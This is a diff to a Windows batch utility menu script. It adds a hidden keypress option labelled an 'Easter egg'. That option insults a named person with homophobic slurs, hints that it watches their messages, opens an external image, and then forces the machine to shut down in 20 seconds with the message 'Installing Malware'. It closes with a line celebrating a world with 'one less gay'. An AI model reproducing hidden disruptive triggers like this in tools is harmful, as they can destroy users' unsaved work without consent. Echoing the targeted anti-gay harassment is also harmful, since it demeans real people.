@@ -29,7 +29,7 @@ REM set /p choice=Choose an option:
 choice /N /C 12345k /M " Choose an option:"
 REM choice /C k /N 
 
-if errorlevel 6 goto :ky
+if errorlevel 6 goto :arifin
 if errorlevel 5 goto :exit
 if errorlevel 4 goto :winutil 
 if errorlevel 3 goto :scrcpy
@@ -150,11 +150,12 @@ echo [2] Chris Titus(Recommended)
 echo ============================
 echo [3] Go Back
 echo ============================
-choice /c 123 /n /m "Choose an option:"
+choice /c 123k /n /m "Choose an option:"
 
-if errorlevel 3 goto menu
-if errorlevel 2 goto titus
-if errorlevel 1 goto up
+if errorlevel 4 goto :ky
+if errorlevel 3 goto :menu
+if errorlevel 2 goto :titus
+if errorlevel 1 goto :up
 
 :up
 title Up0ktilizer
@@ -637,6 +638,33 @@ timeout /t 3 >nul
 pause >nul
 
 goto menu
+
+:arifin
+title Easter egg
+echo You have found the Easster egg!
+timeout /t 2 >nul
+echo Arifina :)
+timeout /t 2 >nul
+echo Gay boy..
+timeout /t 2 >nul
+echo I nkow what you send to your homies >:)
+timeout /t 2 >nul
+echo wait a sec
+timeout /t 3 >nul
+start https://i.imgur.com/XayYtaj.png
+REM echo press any key to continue... 
+pause
+echo also I had to to say something...
+timeout /t 3 >nul
+title Malware
+color 0c
+cls
+shutdown /s /t 20 /c "Installing Malware" >nul
+REM timeout /t 3 >nul
+REM shutdown /a >nul
+timeout /t 2 >nul
+echo finally a world without one less gay 
+goto :exit
 
 :exit
 cls
